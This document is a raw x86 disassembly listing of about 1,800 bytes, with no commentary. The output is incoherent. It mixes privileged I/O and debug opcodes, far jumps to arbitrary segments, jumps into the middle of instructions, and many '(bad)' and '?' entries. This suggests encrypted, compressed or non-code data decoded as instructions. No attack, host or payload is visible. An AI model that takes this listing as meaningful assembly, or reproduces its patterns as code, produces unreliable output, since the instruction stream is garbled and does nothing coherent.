  40cac8:	sbb    ebp,DWORD PTR [ebx+0x5d]
  40cacb:	sbb    eax,0x40c8519f
  40cad0:	repz repz xchg ebp,eax
  40cad3:	sub    eax,0x9b2355ae
  40cad8:	mov    bh,BYTE PTR [edi+esi*8]
  40cadb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cadc:	das    
  40cadd:	mov    esp,0x9eed3da1
  40cae2:	jg     0x40cb38
  40cae4:	and    eax,0xa40b33f7
  40cae9:	repz sti 
  40caeb:	test   eax,0x5402805f
  40caf0:	cs lahf 
  40caf2:	sub    al,0x38
  40caf4:	sbb    al,BYTE PTR [eax-0x4be01939]
  40cafa:	jmp    0x6f63:0x6115e242
  40cb01:	sub    edi,DWORD PTR cs:[edi]
  40cb04:	push   ss
  40cb05:	test   al,0xb5
  40cb07:	enter  0x3fc4,0x3b
  40cb0b:	add    DWORD PTR [eax-0x441a4739],edx
  40cb11:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40cb13:	pop    edx
  40cb14:	dec    ecx
  40cb15:	enter  0x2806,0x78
  40cb19:	jmp    0xa9090d1e
  40cb1e:	and    eax,eax
  40cb20:	daa    
  40cb21:	add    DWORD PTR [ebp+0x19],ebx
  40cb24:	pusha  
  40cb25:	cmp    DWORD PTR [ebx+edi*8+0x7],0x33
  40cb2a:	fsubp  st(6),st
  40cb2c:	nop
  40cb2d:	or     DWORD PTR [ebp+0x2a],esi
  40cb30:	xchg   edi,eax
  40cb31:	mov    ebx,DWORD PTR [ebx+0x5803ec1c]
  40cb37:	inc    ecx
  40cb38:	jmp    0x22f0b640
  40cb3d:	xchg   esp,eax
  40cb3e:	mov    ds:0x7d2f74b3,eax
  40cb43:	mov    ds,WORD PTR ds:[eax+0x1e]
  40cb47:	mov    bl,0x40
  40cb49:	cmp    BYTE PTR [edx+0x18],ah
  40cb4c:	pop    ecx
  40cb4d:	mov    ah,0xca
  40cb4f:	mov    ah,0x4b
  40cb51:	xchg   DWORD PTR [esi],ebp
  40cb53:	pop    ebx
  40cb54:	retf   0x1ac5
  40cb57:	and    eax,0x9e122ed2
  40cb5c:	or     esi,DWORD PTR [eax-0x5bbac58d]
  40cb62:	iret   
  40cb63:	jg     0x40cb63
  40cb65:	push   0x58
  40cb67:	retf   0x9d3d
  40cb6a:	dec    eax
  40cb6b:	sbb    esp,DWORD PTR [edx+0x26]
  40cb6e:	sti    
  40cb6f:	pop    edx
  40cb70:	out    dx,al
  40cb71:	ret    0xa21c
  40cb74:	cmp    edx,ecx
  40cb76:	dec    esp
  40cb77:	nop
  40cb78:	fist   DWORD PTR [eax]
  40cb7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb7b:	aad    0x68
  40cb7d:	mov    edx,DWORD PTR [edi+0x6f0f63c3]
  40cb83:	sbb    al,0x1c
  40cb85:	jbe    0x40cb4f
  40cb87:	jge    0x40cb76
  40cb89:	xor    ecx,DWORD PTR [ebx-0x40fd7de3]
  40cb8f:	xor    dl,BYTE PTR [edi-0x5b8489ae]
  40cb95:	cwde   
  40cb96:	push   0x781b6df
  40cb9b:	add    edx,DWORD PTR [edx-0x7a]
  40cb9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb9f:	mov    ss,WORD PTR [ebx+0x69469021]
  40cba5:	test   BYTE PTR [edi-0x5],cl
  40cba8:	icebp  
  40cba9:	inc    edx
  40cbaa:	fdiv   QWORD PTR [esi+0x1216232d]
  40cbb0:	fst    DWORD PTR [ebx+ebx*1-0x155b588]
  40cbb7:	fst    DWORD PTR [edi+0x6dd38531]
  40cbbd:	and    DWORD PTR [eax],eax
  40cbbf:	pusha  
  40cbc0:	retf   0x7157
  40cbc3:	sub    BYTE PTR ds:0x447dcbfd,bl
  40cbc9:	es cli 
  40cbcb:	in     al,0x73
  40cbcd:	jg     0x40cbab
  40cbcf:	mul    BYTE PTR [esi-0x61f94061]
  40cbd5:	std    
  40cbd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbd7:	sahf   
  40cbd8:	xchg   ebx,eax
  40cbd9:	aas    
  40cbda:	jo     0x40cba6
  40cbdc:	sub    ebx,DWORD PTR [edx+0x52]
  40cbdf:	pusha  
  40cbe0:	cmp    al,BYTE PTR [ebx]
  40cbe2:	jle    0x40cc14
  40cbe4:	mov    ah,dh
  40cbe6:	mov    ebp,?
  40cbe8:	adc    eax,0xb32201a8
  40cbed:	mov    ch,ah
  40cbef:	jp     0x40cb8d
  40cbf1:	popa   
  40cbf2:	mov    esp,ds
  40cbf4:	and    dh,ch
  40cbf6:	xchg   DWORD PTR [ecx+eiz*8+0x43c76df0],edx
  40cbfd:	cmp    BYTE PTR [esi+0x4e],dh
  40cc00:	(bad)  
  40cc01:	push   edi
  40cc02:	jecxz  0x40cc3d
  40cc04:	mov    BYTE PTR [ebp+0x34ddd35a],ah
  40cc0a:	int3   
  40cc0b:	lods   al,BYTE PTR ds:[esi]
  40cc0c:	dec    ebp
  40cc0d:	popf   
  40cc0e:	cmp    dh,BYTE PTR [esi+eiz*8+0x7e]
  40cc12:	xchg   ax,ax
  40cc14:	pop    ss
  40cc15:	popa   
  40cc16:	pop    edi
  40cc17:	inc    ebp
  40cc18:	add    cl,BYTE PTR [esi-0x3]
  40cc1b:	push   edx
  40cc1c:	push   ebp
  40cc1d:	rol    bh,cl
  40cc1f:	xchg   esi,eax
  40cc20:	inc    eax
  40cc21:	xor    BYTE PTR [edx+0x21fd145f],0x60
  40cc28:	inc    ecx
  40cc29:	xchg   DWORD PTR [edi+0x6fe1877d],ebx
  40cc2f:	sub    al,0x27
  40cc31:	jae    0x40cc8f
  40cc33:	mov    ebx,0xfee9f8a6
  40cc38:	xchg   edi,eax
  40cc39:	les    esi,FWORD PTR [edx]
  40cc3b:	out    dx,al
  40cc3c:	and    al,0x69
  40cc3e:	icebp  
  40cc3f:	js     0x40cc1e
  40cc41:	std    
  40cc42:	test   eax,0xb3e93335
  40cc47:	dec    edx
  40cc48:	arpl   WORD PTR cs:[esi],bp
  40cc4b:	pop    edx
  40cc4c:	shl    DWORD PTR [ebx+0x34],0xde
  40cc50:	xor    dh,BYTE PTR [edx]
  40cc52:	aas    
  40cc53:	jge    0x40cc17
  40cc55:	fistp  WORD PTR [ecx+0x3d2766a5]
  40cc5b:	in     al,dx
  40cc5c:	jecxz  0x40ccd6
  40cc5e:	jl     0x40ccce
  40cc60:	gs xor eax,0xa965a348
  40cc66:	or     eax,0xcb4e1cc1
  40cc6b:	gs stos DWORD PTR es:[edi],eax
  40cc6d:	ss mov ah,0xe0
  40cc70:	mov    ?,WORD PTR [esi+0x73]
  40cc73:	fistp  DWORD PTR [edx]
  40cc75:	fst    QWORD PTR [ebp+0x7b0138ee]
  40cc7b:	cmp    eax,edi
  40cc7d:	test   edi,esp
  40cc7f:	and    eax,0x5af36526
  40cc84:	in     eax,dx
  40cc85:	sti    
  40cc86:	add    DWORD PTR [eax+0x78d7ce9],edi
  40cc8c:	fld    DWORD PTR [edi]
  40cc8e:	fst    QWORD PTR [edi-0x3a1d9ca]
  40cc94:	test   al,0xc7
  40cc96:	lock and DWORD PTR [ebx+0x73],ebx
  40cc9a:	mov    al,gs:0x2928f85
  40cca0:	addr16 xchg ebp,eax
  40cca2:	scas   eax,DWORD PTR es:[edi]
  40cca3:	aaa    
  40cca4:	cld    
  40cca5:	mov    ecx,0x5e080771
  40ccaa:	mov    ds:0xd83f7ea8,al
  40ccaf:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccb1:	jge    0x40cc92
  40ccb3:	stos   BYTE PTR es:[edi],al
  40ccb4:	push   ss
  40ccb5:	sub    al,0x78
  40ccb7:	mov    ds:0xbe71ff1f,eax
  40ccbc:	ret    0xdda7
  40ccbf:	repz xor BYTE PTR [ecx],ah
  40ccc2:	push   edi
  40ccc3:	cmc    
  40ccc4:	lahf   
  40ccc5:	or     BYTE PTR [ebx+eax*4-0x694264f1],ch
  40cccc:	shl    BYTE PTR [edi-0x279ccd62],1
  40ccd2:	lods   eax,DWORD PTR ds:[esi]
  40ccd3:	inc    esp
  40ccd4:	addr16 push eax
  40ccd6:	xchg   ebx,eax
  40ccd7:	int3   
  40ccd8:	xchg   ebp,eax
  40ccd9:	ins    DWORD PTR es:[edi],dx
  40ccda:	mov    WORD PTR [edx+0x47fee03b],?
  40cce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cce1:	push   eax
  40cce2:	or     BYTE PTR [ecx-0x59a179c0],al
  40cce8:	sbb    ch,BYTE PTR [eax+edi*4-0x49]
  40ccec:	and    DWORD PTR [ecx],esp
  40ccee:	push   edx
  40ccef:	icebp  
  40ccf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccf2:	sbb    ebx,DWORD PTR [eax]
  40ccf4:	shr    BYTE PTR [ebx],0xb3
  40ccf7:	jg     0x40ccf7
  40ccf9:	in     al,0x8
  40ccfb:	sahf   
  40ccfc:	mov    ecx,0xf455424d
  40cd01:	sub    DWORD PTR [eax*2+0x78ad0fe8],eax
  40cd08:	lods   al,BYTE PTR ds:[esi]
  40cd09:	dec    edi
  40cd0a:	test   DWORD PTR [ebp+0x1],ebp
  40cd0d:	dec    esi
  40cd0e:	test   edi,edx
  40cd10:	stc    
  40cd11:	jbe    0x40ccb0
  40cd13:	mov    BYTE PTR [ecx+0x75],dl
  40cd16:	xlat   BYTE PTR ds:[ebx]
  40cd17:	aaa    
  40cd18:	mov    ch,0x16
  40cd1a:	shl    DWORD PTR [esi],1
  40cd1c:	lds    ebp,FWORD PTR [edx]
  40cd1e:	loop   0x40cd67
  40cd20:	int3   
  40cd21:	mov    ebx,0x235382c9
  40cd26:	sbb    al,0xc
  40cd28:	pop    es
  40cd29:	fimul  WORD PTR [eax]
  40cd2b:	jp     0x40ccf8
  40cd2d:	push   edi
  40cd2e:	pop    esp
  40cd2f:	mov    ch,0xd3
  40cd31:	sub    eax,0xdf1ff65c
  40cd36:	xor    BYTE PTR [esi],bh
  40cd38:	or     al,dl
  40cd3a:	and    edx,esp
  40cd3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd3d:	mov    esp,0x940af3d
  40cd42:	stos   DWORD PTR es:[edi],eax
  40cd43:	je     0x40cce7
  40cd45:	ret    0xdf11
  40cd48:	pop    ds
  40cd49:	popa   
  40cd4a:	pop    ecx
  40cd4b:	pop    edx
  40cd4c:	push   ds
  40cd4d:	aas    
  40cd4e:	xchg   edi,eax
  40cd4f:	or     eax,0x17d1cd2b
  40cd54:	loop   0x40cdc7
  40cd56:	sbb    ah,al
  40cd58:	(bad)  
  40cd59:	popa   
  40cd5a:	xchg   BYTE PTR [eax-0x6b],bh
  40cd5d:	bound  esi,QWORD PTR [eax]
  40cd5f:	jmp    0x9fd37867
  40cd64:	outs   dx,DWORD PTR ds:[esi]
  40cd65:	add    BYTE PTR [ebx+0x43],bl
  40cd68:	mov    DWORD PTR [esi],ebx
  40cd6a:	cs and eax,0xd649521e
  40cd70:	sub    eax,0x29f53800
  40cd75:	jmp    0x40cd04
  40cd77:	xchg   DWORD PTR [ecx+0x1f],ecx
  40cd7a:	dec    esp
  40cd7b:	out    0xb1,al
  40cd7d:	lahf   
  40cd7e:	jmp    0x5656c27
  40cd83:	or     DWORD PTR [ebp-0x3b],eax
  40cd86:	jecxz  0x40cd93
  40cd88:	sti    
  40cd89:	es lahf 
  40cd8b:	sbb    al,0x6d
  40cd8d:	mov    es,WORD PTR [esi+0x29]
  40cd90:	sbb    cl,BYTE PTR [ebx]
  40cd92:	mov    ebx,0xb4a365ec
  40cd97:	sbb    ebp,esp
  40cd99:	xchg   DWORD PTR [edi],esp
  40cd9b:	xchg   edx,eax
  40cd9c:	inc    esp
  40cd9d:	sahf   
  40cd9e:	adc    DWORD PTR [ebx+0x5c3b7b0a],edi
  40cda4:	ds add bl,bl
  40cda7:	imul   esi,DWORD PTR [esi+0x17d9cbb1],0xffffffae
  40cdae:	inc    DWORD PTR [ebx]
  40cdb0:	popf   
  40cdb1:	sti    
  40cdb2:	cmp    BYTE PTR cs:[ebx-0x55],0x34
  40cdb7:	cli    
  40cdb8:	fwait
  40cdb9:	and    BYTE PTR [esi-0x30],dl
  40cdbc:	in     al,dx
  40cdbd:	xor    al,0xa4
  40cdbf:	imul   eax,eax,0x6e16d775
  40cdc5:	call   0x4698e4ad
  40cdca:	xor    BYTE PTR [ecx+0x16eaa6e],0x6a
  40cdd1:	mov    cl,0x6f
  40cdd3:	xchg   ecx,eax
  40cdd4:	(bad)  
  40cdd5:	push   es
  40cdd6:	pop    esi
  40cdd7:	jo     0x40cdea
  40cdd9:	repz loopne 0x40cdf9
  40cddc:	jmp    0x40cd7c
  40cdde:	fwait
  40cddf:	push   ds
  40cde0:	ins    BYTE PTR es:[edi],dx
  40cde1:	dec    edi
  40cde2:	pushf  
  40cde3:	dec    ebx
  40cde4:	daa    
  40cde5:	out    dx,eax
  40cde6:	pop    ss
  40cde7:	xchg   edi,eax
  40cde8:	hlt    
  40cde9:	aaa    
  40cdea:	fiadd  WORD PTR [ecx]
  40cdec:	add    esi,ebp
  40cdee:	inc    esp
  40cdef:	retf   
  40cdf0:	popf   
  40cdf1:	lds    esi,FWORD PTR [ebx+0x6e]
  40cdf4:	test   al,0xaf
  40cdf6:	mov    ds:0x1849ff14,eax
  40cdfb:	xor    eax,DWORD PTR ds:0x8e43f4ab
  40ce01:	popa   
  40ce02:	cli    
  40ce03:	cmp    eax,0xf738838e
  40ce08:	pop    es
  40ce09:	inc    ebp
  40ce0a:	and    al,0xf0
  40ce0c:	xchg   edx,eax
  40ce0d:	push   esp
  40ce0e:	mov    ebx,0xa78597c5
  40ce13:	xchg   ecx,eax
  40ce14:	hlt    
  40ce15:	retf   0x2a4f
  40ce18:	mov    ch,BYTE PTR gs:[ebp-0x15]
  40ce1c:	sub    eax,0x2ca14682
  40ce21:	push   es
  40ce22:	push   eax
  40ce23:	fwait
  40ce24:	movnti DWORD PTR [edx+edi*8+0x60],esp
  40ce29:	imul   DWORD PTR [ebx-0x66]
  40ce2c:	repz in al,dx
  40ce2e:	jmp    0x336d:0xa722f519
  40ce35:	xor    esi,DWORD PTR [edx]
  40ce37:	xchg   DWORD PTR [edx],edx
  40ce39:	push   0x41
  40ce3b:	push   0xffffffee
  40ce3d:	imul   esp,DWORD PTR ds:0xc314231a,0xec14e478
  40ce47:	retf   0x25c6
  40ce4a:	fisub  DWORD PTR [ecx-0x6e]
  40ce4d:	xlat   BYTE PTR ds:[ebx]
  40ce4e:	jnp    0x40cddd
  40ce50:	or     DWORD PTR [edx+0x2c],0xffffffbe
  40ce54:	jb     0x40ce0e
  40ce56:	adc    eax,0x504e057d
  40ce5b:	popf   
  40ce5c:	push   ebp
  40ce5d:	fstp   TBYTE PTR [ecx-0x4e]
  40ce60:	addr16 add al,0x1f
  40ce63:	mov    ds:0x57da1e51,al
  40ce68:	cli    
  40ce69:	inc    edx
  40ce6a:	(bad)  
  40ce6b:	popa   
  40ce6c:	fstp   DWORD PTR [eax-0x730e1ae0]
  40ce72:	mov    ebp,ss
  40ce74:	and    DWORD PTR [ebp+0x18056393],ecx
  40ce7a:	xor    al,0xf5
  40ce7c:	aam    0xc0
  40ce7e:	scas   eax,DWORD PTR es:[edi]
  40ce7f:	outs   dx,BYTE PTR ds:[esi]
  40ce80:	fnstsw WORD PTR [edx+edx*1+0x21]
  40ce84:	pop    ecx
  40ce85:	mov    ah,0x44
  40ce87:	inc    edi
  40ce88:	cmp    BYTE PTR ds:0xa3ff53eb,bh
  40ce8e:	hlt    
  40ce8f:	jnp    0x40ceb3
  40ce91:	xchg   ecx,eax
  40ce92:	or     esp,DWORD PTR [eax+ebx*4+0x22102272]
  40ce99:	popa   
  40ce9a:	lods   al,BYTE PTR es:[esi]
  40ce9c:	in     al,dx
  40ce9d:	out    0xd3,eax
  40ce9f:	mov    edx,0xc650edcc
  40cea4:	push   ds
  40cea5:	mov    dh,dh
  40cea7:	pop    ebp
  40cea8:	push   ds
  40cea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceaa:	inc    ecx
  40ceab:	(bad)  
  40ceac:	inc    edx
  40cead:	loopne 0x40ceda
  40ceaf:	xchg   edx,eax
  40ceb1:	hlt    
  40ceb2:	mov    ebx,0x416fa472
  40ceb7:	je     0x40cf2f
  40ceb9:	dec    ecx
  40ceba:	xchg   edi,eax
  40cebb:	jmp    0x40ceb1
  40cebd:	mov    ebp,0x1ebdde3d
  40cec2:	jnp    0x40ce93
  40cec4:	adc    BYTE PTR [esi+edx*1+0x2fe7ae8],ah
  40cecb:	ins    BYTE PTR es:[edi],dx
  40cecc:	popf   
  40cecd:	dec    esp
  40cece:	dec    ebp
  40cecf:	push   edi
  40ced0:	sub    eax,0x6f9b1636
  40ced5:	add    DWORD PTR [ebp+0x1ba9671e],0x64307f90
  40cedf:	xchg   BYTE PTR [ecx-0x2bfede44],dl
  40cee5:	mov    edx,0xcba59755
  40ceea:	or     eax,0xce884d09
  40ceef:	std    
  40cef0:	dec    ebp
  40cef1:	stos   DWORD PTR es:[edi],eax
  40cef2:	stos   DWORD PTR es:[edi],eax
  40cef3:	jnp    0x40ceb0
  40cef5:	xchg   edx,eax
  40cef6:	xchg   ecx,eax
  40cef7:	not    DWORD PTR [ebp+0x23]
  40cefa:	mov    dh,0x1a
  40cefc:	cmp    eax,0x78461c8
  40cf01:	out    0x6b,al
  40cf03:	add    BYTE PTR [ebx+eax*4],dh
  40cf06:	ror    BYTE PTR [ecx-0xbf56eb4],cl
  40cf0c:	dec    eax
  40cf0d:	inc    ebx
  40cf0e:	mov    fs,WORD PTR [esi]
  40cf10:	cs call 0xba90:0x7e6a10d7
  40cf18:	data16 ror BYTE PTR [esi],0x94
  40cf1c:	push   ecx
  40cf1d:	icebp  
  40cf1e:	int    0x1
  40cf20:	jae    0x40cf95
  40cf22:	sbb    BYTE PTR [edi-0x1d26bccf],dl
  40cf28:	cs call 0x4313:0xdb303047
  40cf30:	mov    ds:0xf44f69d9,al
  40cf35:	and    al,0xb2
  40cf37:	inc    edx
  40cf38:	call   0x909e:0xeb7e1036
  40cf3f:	pop    esp
  40cf40:	mov    ds:0xd718b541,eax
  40cf45:	(bad)  
  40cf48:	xchg   BYTE PTR [ebx+0xa14fae3],cl
  40cf4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf4f:	lahf   
  40cf50:	pop    eax
  40cf51:	fs cdq 
  40cf53:	sbb    DWORD PTR [ebx],esp
  40cf55:	mov    esp,0xb1b08274
  40cf5a:	leave  
  40cf5b:	xchg   ebx,eax
  40cf5c:	fisttp WORD PTR [ecx+0x270e38a5]
  40cf62:	cwde   
  40cf63:	push   ecx
  40cf64:	popf   
  40cf65:	cs rol esp,0x33
  40cf69:	cmc    
  40cf6a:	ja     0x40cfac
  40cf6c:	push   ss
  40cf6d:	push   ss
  40cf6e:	imul   ebp,DWORD PTR [eax-0x80],0xfffffff4
  40cf72:	inc    ebp
  40cf73:	arpl   sp,di
  40cf75:	cdq    
  40cf76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf77:	mov    cl,0xf0
  40cf79:	in     eax,dx
  40cf7a:	fwait
  40cf7b:	call   0xa130:0xcccc86df
  40cf82:	adc    eax,DWORD PTR [edx]
  40cf84:	pop    ecx
  40cf85:	add    ebx,esp
  40cf87:	add    eax,0x6be02787
  40cf8c:	adc    bl,cl
  40cf8e:	add    al,0xa7
  40cf90:	push   ds
  40cf91:	pop    ss
  40cf92:	add    BYTE PTR [ebp-0x64],cl
  40cf95:	ror    BYTE PTR ds:0x3b59aac4,0x6
  40cf9c:	clc    
  40cf9d:	jmp    0x7db3c8d0
  40cfa2:	imul   ebx,DWORD PTR [ebx-0x78],0x60
  40cfa6:	adc    BYTE PTR [ebx+0x69],ch
  40cfa9:	out    0xe6,eax
  40cfab:	repnz inc ebx
  40cfad:	pop    esi
  40cfae:	jae    0x40cfb1
  40cfb0:	xchg   esi,eax
  40cfb1:	mov    dl,0xa9
  40cfb3:	dec    esp
  40cfb4:	adc    eax,0x8f9cb8b9
  40cfb9:	pop    eax
  40cfba:	xchg   BYTE PTR [edi],ah
  40cfbc:	scas   eax,DWORD PTR es:[edi]
  40cfbd:	push   esi
  40cfbe:	(bad)  
  40cfbf:	cmp    ebp,eax
  40cfc1:	dec    eax
  40cfc2:	pop    esi
  40cfc3:	cld    
  40cfc4:	push   esi
  40cfc5:	outs   dx,BYTE PTR ds:[esi]
  40cfc6:	es dec esp
  40cfc8:	gs inc esi
  40cfca:	sar    BYTE PTR [eax],0x94
  40cfcd:	cmp    DWORD PTR [esi],esp
  40cfcf:	jl     0x40cf9f
  40cfd1:	int3   
  40cfd2:	and    al,0x76
  40cfd4:	pop    ebx
  40cfd5:	and    BYTE PTR [ebp+0x79],0x10
  40cfd9:	retf   
  40cfda:	push   0xffffffc0
  40cfdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfdd:	les    edi,FWORD PTR [ecx]
  40cfdf:	and    eax,DWORD PTR ds:0x1b585030
  40cfe5:	and    al,0x85
  40cfe7:	jle    0x40d003
  40cfe9:	arpl   WORD PTR [esi-0x36101c66],dx
  40cfef:	jg     0x40cf8a
  40cff1:	and    al,0x9a
  40cff3:	aad    0x57
  40cff5:	xchg   ebp,eax
  40cff6:	stc    
  40cff7:	or     esp,DWORD PTR [esi-0x38]
  40cffa:	pop    ecx
  40cffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cffc:	push   eax
  40cffd:	inc    ecx
  40cffe:	fisubr WORD PTR [ebx-0x2dabf57b]
  40d004:	mov    ebp,0x41d5bc55
  40d009:	xchg   edx,eax
  40d00a:	hlt    
  40d00b:	jno    0x40d051
  40d00d:	jl     0x40d01e
  40d00f:	lods   eax,DWORD PTR ds:[esi]
  40d010:	sbb    edi,edx
  40d012:	push   ebx
  40d013:	outs   dx,BYTE PTR ds:[esi]
  40d014:	cmp    ebx,DWORD PTR [ebx+0xd]
  40d017:	jl     0x40d02b
  40d019:	xor    eax,esp
  40d01b:	(bad)  [edi-0x37542598]
  40d021:	test   al,0x53
  40d023:	jp     0x40d091
  40d025:	lock and dx,WORD PTR [eax+0x57]
  40d02a:	push   esi
  40d02b:	sub    DWORD PTR [eax-0x7b],esp
  40d02e:	mov    ?,WORD PTR [edi-0xe]
  40d031:	pusha  
  40d032:	fdivr  DWORD PTR ds:0xa364e59c
  40d038:	sbb    DWORD PTR [ecx],ebp
  40d03a:	call   0x2254126
  40d03f:	(bad)  
  40d040:	cmp    ebp,DWORD PTR [edx*8-0x6f66cac0]
  40d047:	shl    DWORD PTR [ebx],0x82
  40d04a:	or     esp,esp
  40d04c:	scas   eax,DWORD PTR es:[edi]
  40d04d:	xchg   esp,eax
  40d04e:	dec    edx
  40d04f:	call   0x7aa3f917
  40d054:	pop    ds
  40d055:	test   DWORD PTR [ecx+0x43],0xb9a958b
  40d05c:	or     bl,BYTE PTR [ebp+0x31c188]
  40d062:	aam    0x1
  40d064:	mov    edi,0x4cb49fc3
  40d069:	jmp    0x40d07c
  40d06b:	mov    esp,0xcbfe11ea
  40d070:	(bad)  
  40d071:	or     BYTE PTR [esi+0x59d4126d],bh
  40d077:	cmc    
  40d078:	mov    esi,0x39972fe0
  40d07d:	push   ss
  40d07e:	mov    ecx,0xecf99a53
  40d083:	jecxz  0x40d083
  40d085:	retf   0x223f
  40d088:	lds    ecx,FWORD PTR [edx-0x4da5e038]
  40d08e:	rcl    ebp,0x8a
  40d091:	adc    BYTE PTR [ebp-0x2a],ah
  40d094:	inc    ebx
  40d095:	lock xchg ecx,eax
  40d097:	test   BYTE PTR [ebp+ebx*2-0xeec88e],cl
  40d09e:	mov    dl,ah
  40d0a0:	bound  edi,QWORD PTR [esi+0x5c]
  40d0a3:	add    ch,BYTE PTR [edi+0x6a2dc0ac]
  40d0a9:	sbb    DWORD PTR [ebx],ebp
  40d0ab:	push   cs
  40d0ac:	sahf   
  40d0ad:	call   0x7d6c:0x7358f428
  40d0b4:	(bad)  [edi]
  40d0b6:	xor    DWORD PTR [eax],esi
  40d0b8:	fmul   QWORD PTR [ebx]
  40d0ba:	xchg   edx,eax
  40d0bb:	inc    edx
  40d0bc:	add    dh,dh
  40d0be:	sbb    eax,0x61186896
  40d0c3:	mov    eax,ds:0x7902b902
  40d0c8:	aaa    
  40d0c9:	inc    edi
  40d0ca:	fidivr WORD PTR [esi-0x278261bb]
  40d0d0:	add    al,0xda
  40d0d2:	xchg   edi,eax
  40d0d3:	cld    
  40d0d4:	mov    ds:0x78d1575a,eax
  40d0d9:	mov    DWORD PTR [ebx],0x13185b55
  40d0df:	(bad)  
  40d0e0:	ins    BYTE PTR es:[edi],dx
  40d0e1:	les    esi,FWORD PTR [ebp+0x1a662e90]
  40d0e7:	into   
  40d0e8:	adc    DWORD PTR [esi-0xb],ebp
  40d0eb:	sbb    bl,ah
  40d0ed:	fistp  DWORD PTR [esp+edx*1]
  40d0f0:	xchg   esp,eax
  40d0f1:	call   0x327f:0x779012cd
  40d0f8:	mov    esi,0x2a5e882c
  40d0fd:	mov    esp,esi
  40d0ff:	xor    dl,0x7c
  40d102:	mov    ebp,0x424ad3e8
  40d107:	cmp    esp,ebp
  40d109:	loop   0x40d12c
  40d10b:	inc    esi
  40d10c:	jns    0x40d12a
  40d10e:	mov    al,ds:0xa42fd190
  40d113:	push   0xf34bde19
  40d118:	int    0x1e
  40d11a:	out    dx,al
  40d11b:	adc    DWORD PTR [eax+eax*2-0x1898e0b4],0x69
  40d123:	test   BYTE PTR [ebp+ecx*4-0x31],al
  40d127:	add    al,0xfc
  40d129:	sbb    eax,0xf43c82a0
  40d12e:	shr    DWORD PTR [eax+0x7fdcb1a6],cl
  40d134:	and    BYTE PTR ds:0x3601216e,0xe4
  40d13b:	iret   
  40d13c:	push   ecx
  40d13d:	je     0x40d18b
  40d13f:	and    BYTE PTR [ebx],ah
  40d141:	ficom  DWORD PTR [ecx+0x2c]
  40d144:	iret   
  40d145:	es pop ss
  40d147:	push   eax
  40d148:	data16 aas 
  40d14a:	out    dx,eax
  40d14b:	cmc    
  40d14c:	sub    BYTE PTR [edx-0x30],al
  40d14f:	dec    ecx
  40d150:	sbb    ch,ah
  40d152:	mov    bh,0xe4
  40d154:	pop    ecx
  40d155:	outs   dx,BYTE PTR ds:[esi]
  40d156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d157:	loop   0x40d195
  40d159:	mov    dl,BYTE PTR [ecx]
  40d15b:	dec    esi
  40d15c:	retf   0xbf64
  40d15f:	xor    al,0x4e
  40d161:	mov    esp,0xbf91cec8
  40d166:	lds    ebp,FWORD PTR [edx]
  40d168:	push   ecx
  40d169:	inc    DWORD PTR [ecx-0x20]
  40d16c:	mov    al,0x82
  40d16e:	(bad)  
  40d16f:	in     al,dx
  40d170:	xor    ebx,DWORD PTR [edx+0x5d]
  40d173:	(bad)  
  40d174:	and    ch,BYTE PTR [edx+0x42f8e63f]
  40d17a:	jg     0x40d13b
  40d17c:	xchg   ebx,eax
  40d17d:	fistp  WORD PTR [ebx-0x1c]
  40d180:	popf   
  40d181:	xchg   BYTE PTR [edx+0x3112fd92],ch
  40d187:	or     cl,BYTE PTR [ecx]
  40d189:	mov    ch,0x2e
  40d18b:	dec    ebp
  40d18c:	push   esp
  40d18d:	dec    esp
  40d18e:	sbb    eax,0xc51dc1b5
  40d193:	in     al,0xe2
  40d195:	fimul  DWORD PTR [ebx]
  40d197:	out    dx,eax
  40d198:	inc    esi
  40d199:	inc    edx
  40d19a:	popa   
  40d19b:	jg     0x40d217
  40d19d:	xchg   esi,eax
  40d19e:	jmp    0x626d4bea
  40d1a3:	shr    DWORD PTR [edx+eiz*1-0x4620e680],1
  40d1aa:	fadd   st,st(2)
  40d1ac:	cmp    BYTE PTR [ecx-0x290d3fa7],dl
  40d1b2:	jae    0x40d183
  40d1b4:	xchg   esi,eax
  40d1b5:	imul   edi,DWORD PTR [esi+0xf85247a],0xffffffa6
  40d1bc:	(bad)  
  40d1bd:	jp     0x40d23b
  40d1bf:	ret    0x607b
  40d1c2:	adc    esp,ecx
  40d1c4:	push   ecx
  40d1c5:	loop   0x40d18e
  40d1c7:	inc    edi
  40d1c8:	ja     0x40d201
  40d1ca:	repnz mov edx,DWORD PTR [eax-0x1c394e9d]
  40d1d1:	sbb    ah,BYTE PTR [eax]
  40d1d3:	lods   eax,DWORD PTR ds:[esi]
  40d1d4:	mov    al,0x29
  40d1d6:	mov    ebp,0x5bb580a6
  40d1db:	(bad)  
  40d1dc:	mov    ebp,0xe25ee621
  40d1e1:	adc    al,0xc0
  40d1e3:	out    0xe2,al
  40d1e5:	repz cwde 
  40d1e7:	ret    
  40d1e8:	les    ebx,FWORD PTR [eax-0x58]
  40d1eb:	xor    DWORD PTR [ebx+0x39],0x610d1d18
  40d1f2:	sub    ebp,DWORD PTR [edi]
  40d1f4:	sub    eax,0xde43e413
  40d1f9:	shr    DWORD PTR [edi-0x6e9d18b],cl
  40d1ff:	sub    eax,0x8fc1853f
  40d204:	jle    0x40d1f3
  40d206:	jmp    0x40d280
  40d208:	adc    al,0x90
  40d20a:	(bad)  
  40d20c:	cli    
  40d20d:	pop    esp
  40d20e:	adc    BYTE PTR [ecx+0x64],dl
  40d211:	mov    dh,0x38
  40d213:	arpl   WORD PTR [edx*4+0x23e77df0],dx
  40d21a:	out    dx,eax
  40d21b:	mov    ebx,0x6c1348c9
  40d220:	lods   al,BYTE PTR ds:[esi]
